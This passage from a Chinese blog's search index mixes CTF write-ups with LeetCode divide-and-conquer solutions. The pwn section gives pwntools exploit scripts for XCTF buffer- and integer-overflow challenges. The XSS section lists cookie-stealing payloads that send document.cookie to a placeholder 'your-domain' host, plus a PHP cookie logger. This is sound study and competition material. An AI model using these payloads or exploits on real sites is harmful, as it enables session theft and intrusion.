-        <tag>wp</tag>
-        <tag>hacker101</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn-xctf-新手区wp</title>
-    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
-    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
-<span id="more"></span>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
-<p>简单的输入提示，基本上获得不了什么信息。</p>
-<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
-<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
-<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#x73;&#121;&#x73;&#x74;&#101;&#x6d;&#x40;&#112;&#108;&#x74;">&#x73;&#121;&#x73;&#x74;&#101;&#x6d;&#x40;&#112;&#108;&#x74;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
-<p>Python的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
-<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" alt=""></p>
-<p>exp.py如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="三、int-overflow（整数溢出）"><a href="#三、int-overflow（整数溢出）" class="headerlink" title="三、int_overflow（整数溢出）"></a>三、int_overflow（整数溢出）</h2><p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
-<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" alt=""></p>
-<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
-<p>注意到，v3是unsigned __int8 类型，当int  strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
-<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
-<p>exp.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>pwn</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>xctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode-分治-最接近原点的K个点</title>
-    <url>/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/</url>
-    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
-<p>这里，平面上两点之间的距离是 欧几里德距离（ √(x1 - x2)2 + (y1 - y2)2 ）。</p>
-<p>你可以按 <strong>任何顺序</strong> 返回答案。除了点坐标的顺序之外，答案 确保 是 <strong>唯一</strong> 的。</p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：points = [[1,3],[-2,2]], k = 1</span><br><span class="line">输出：[[-2,2]]</span><br><span class="line">解释： </span><br><span class="line">(1, 3) 和原点之间的距离为 sqrt(10)，</span><br><span class="line">(-2, 2) 和原点之间的距离为 sqrt(8)，</span><br><span class="line">由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。</span><br><span class="line">我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">输出：[[3,3],[-2,4]]</span><br><span class="line">（答案 [[-2,4],[3,3]] 也会被接受。）</span><br></pre></td></tr></table></figure>
-<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><h4 id="思路一：排序"><a href="#思路一：排序" class="headerlink" title="思路一：排序"></a>思路一：排序</h4><p>显然是非常直观的思路，我们可以直接排序数组，返回前K个数。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;points.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;(i ,points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; (res.<span class="built_in">begin</span>(),res.<span class="built_in">begin</span>() + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>我们这次主要是学习分治的思想，因此我们可以考虑使用快排的思路（其实algorithm的sort也是快排），当我们完成一次快排，我们可以将数组分为两个部分，因此我们可以借此不断将数组分割来找到第K个数。</p>
-<p>代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; dist;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> beg,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = beg;</span><br><span class="line">        <span class="keyword">int</span> j = end;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = points[beg];</span><br><span class="line">        <span class="keyword">int</span> p_dist = dist[beg];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[j] &gt; p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[i] = points[j];</span><br><span class="line">                dist[i] = dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[i] &lt;= p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[j] = points[i];</span><br><span class="line">                dist[j] = dist[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        points[j] = p;</span><br><span class="line">        dist[j] = p_dist;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select_random</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = <span class="built_in">partition</span>(points, left, right);</span><br><span class="line">        <span class="keyword">if</span> (pivot == k)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pivot &lt; k)</span><br><span class="line">        &#123;	<span class="comment">// 注意此时我们使用的是数组的引用，因此我们的K未发生变化</span></span><br><span class="line">            <span class="built_in">select_random</span>(points, pivot + <span class="number">1</span>, right, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">select_random</span>(points, left, pivot - <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tar = k - <span class="number">1</span>;</span><br><span class="line">        dist.<span class="built_in">resize</span>(points.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; points.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = (points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">select_random</span>(points, <span class="number">0</span>, points.<span class="built_in">size</span>() - <span class="number">1</span>, tar);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">res</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-        <category>分治</category>
-      </categories>
-      <tags>
-        <tag>algorithm</tag>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
-        <tag>题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode-分治-为运算表达式设计优先级</title>
-    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
-    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
-<span id="more"></span>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ul>
-<li>1 &lt;= expression.length &lt;= 20</li>
-<li>输入表达式中的所有整数值在范围 [0, 99] </li>
-<li>expression 由数字和算符 ‘+’、’-‘ 和 ‘*’ 组成。</li>
-</ul>
-<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为</p>
-<script type="math/tex; mode=display">
-2*(3-4*5)\\
-2*3-(4*5)</script><p>但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：</p>
-<script type="math/tex; mode=display">
-((2*3)-4)*5</script><p>但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<script type="math/tex">2*3</script>时，我们就把式子转化为$(6-4)*5$，这又是我们之前处理的范围了。</p>
-<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式$c$，我们可以将其拆分为$a$ op $b$，这样我们就得到了分治处理的思路。</p>
-<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
-<p>我的代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-        <category>分治</category>
-      </categories>
-      <tags>
-        <tag>algorithm</tag>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
-        <tag>题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HCTF-warmup-目录穿越</title>
-    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
-    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
-<p>我们首先来看一下</p>
-<span id="more"></span>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>LFI</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>wp</tag>
-        <tag>LFI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-xss-wp</title>
-    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
-    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
-<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
-<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
-<span id="more"></span>
-<p>反射型常见trick：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line">	<span class="comment">//var_dump(scandir(&quot;.&quot;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
-<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
-<p>不过会有各种过滤</p>
-<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
-<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
-<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
-<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
-<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
-<p>顺利搞到管理员的cookie</p>
